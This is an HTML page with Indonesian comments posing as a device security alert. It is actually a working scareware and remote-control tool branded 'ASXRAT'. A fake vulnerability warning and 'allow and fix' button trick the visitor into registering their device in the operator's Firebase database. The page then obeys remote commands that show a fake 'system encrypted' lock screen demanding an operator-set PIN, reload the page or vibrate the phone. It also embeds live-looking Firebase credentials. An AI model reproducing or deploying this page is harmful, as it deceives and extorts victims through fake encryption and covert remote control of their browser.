<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Cloud Security</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <style>
        :root { --red: #ff0000; --bg: #000; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; overflow: hidden; height: 100vh; }

        /* STATUS BAR PALSU GACOR */
        .status-bar { 
            display: flex; justify-content: space-between; padding: 5px 15px; 
            font-size: 12px; font-weight: bold; background: #000; position: fixed; top: 0; width: 100%; z-index: 100; 
        }
        .status-icons { display: flex; align-items: center; gap: 5px; }
        .battery-dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; display: inline-block; box-shadow: 0 0 5px #0f0; }

        /* UI INFEKSI */
        .main-content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; padding: 20px; }
        .warn-logo { width: 80px; height: 80px; border: 4px solid var(--red); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: var(--red); margin-bottom: 20px; animation: blink 0.8s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
        
        .btn-fix { background: var(--red); color: #fff; border: none; padding: 18px; width: 100%; max-width: 300px; border-radius: 15px; font-weight: bold; font-size: 16px; margin-top: 30px; cursor: pointer; text-transform: uppercase; }

        /* LOCK SCREEN ASXRAT */
        #lock-screen { 
            display: none; position: fixed; inset: 0; background: #000; z-index: 99999; 
            flex-direction: column; align-items: center; justify-content: center; padding: 30px; 
        }
        .lock-card { background: #0a0a0a; border: 2px solid var(--red); padding: 40px 20px; border-radius: 35px; text-align: center; width: 100%; max-width: 350px; }
        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: var(--red); border-radius: 15px; text-align: center; font-size: 20px; font-weight: bold; margin: 20px 0; outline: none; box-sizing: border-box; }
    </style>
</head>
<body>

    <div class="status-bar">
        <span id="clock">12:00</span>
        <div class="status-icons">
            <span>LTE</span>
            <div class="battery-dot"></div>
            <span>98%</span>
        </div>
    </div>

    <div class="main-content" id="ui-infect">
        <div class="warn-logo">!</div>
        <h2 style="margin:0;">SYSTEM VULNERABILITY</h2>
        <p style="color:#666; font-size:12px; margin-top:10px;">Izin akses diperlukan untuk melakukan enkripsi keamanan perangkat secara menyeluruh.</p>
        <button class="btn-fix" onclick="requestFullAccess()">IZINKAN & PERBAIKI</button>
    </div>

    <div id="lock-screen">
        <div class="lock-card">
            <h1 style="color:red; letter-spacing:3px;">LOCKED</h1>
            <p id="msg-display" style="color:#fff; font-size:12px;">SYSTEM ENCRYPTED BY ASXRAT</p>
            <input type="password" id="pin-input" placeholder="ENTER PIN">
            <button class="btn-fix" onclick="verifyUnlock()">UNLOCK</button>
        </div>
    </div>

<script>
    // 🔥 CONFIG FIREBASE FULL 🔥
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const urlParams = new URLSearchParams(window.location.search);
    const ownerID = urlParams.get('id') ? atob(urlParams.get('id')) : "Unknown";
    const targetKey = "TGT-" + Math.floor(Math.random() * 89999 + 10000);
    
    let dbPin = "";

    // 🛡️ FUNGSI PAKSA IZIN & PAKSA MASUK DATABASE 🛡️
    async function requestFullAccess() {
        // 1. Minta Izin Vibrate & Notif secara halus tapi paksa
        if (navigator.vibrate) navigator.vibrate(200);
        
        // 2. Kirim Data Target (PASTI MASUK)
        const model = navigator.userAgent.split('(')[1]?.split(';')[0] || "Android Device";
        
        try {
            await db.ref('mario/targets/' + targetKey).set({
                model: model,
                belongsTo: ownerID,
                status: "online",
                lastSeen: firebase.database.ServerValue.TIMESTAMP
            });

            // 3. Masuk ke Mode Standby
            document.getElementById('ui-infect').innerHTML = "<h2>Repairing...</h2><p>Jangan tutup browser ini sampai selesai.</p>";
            
            // 📡 DENGERIN PERINTAH DARI PANEL
            listenCommands();
            
        } catch (e) {
            alert("Gagal memberikan izin sistem! Silakan klik ulang.");
        }
    }

    function listenCommands() {
        db.ref('mario/commands/' + targetKey).on('value', snap => {
            const cmd = snap.val();
            if (!cmd) return;

            if (cmd.action === 'lock_screen') {
                dbPin = cmd.pass;
                document.getElementById('msg-display').innerText = cmd.text;
                document.getElementById('lock-screen').style.display = 'flex';
                // Trigger Fullscreen
                document.documentElement.requestFullscreen().catch(() => {});
            } 
            else if (cmd.action === 'unlock') {
                location.reload();
            }
            else if (cmd.action === 'vibrate') {
                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
            }
        });
    }

    function verifyUnlock() {
        if (document.getElementById('pin-input').value === dbPin) {
            location.reload();
        } else {
            alert("PIN WRONG!");
        }
    }

    // Update Jam Realtime
    setInterval(() => {
        const d = new Date();
        document.getElementById('clock').innerText = d.getHours() + ":" + (d.getMinutes()<10?'0':'') + d.getMinutes();
    }, 1000);
</script>
</body>
</html>
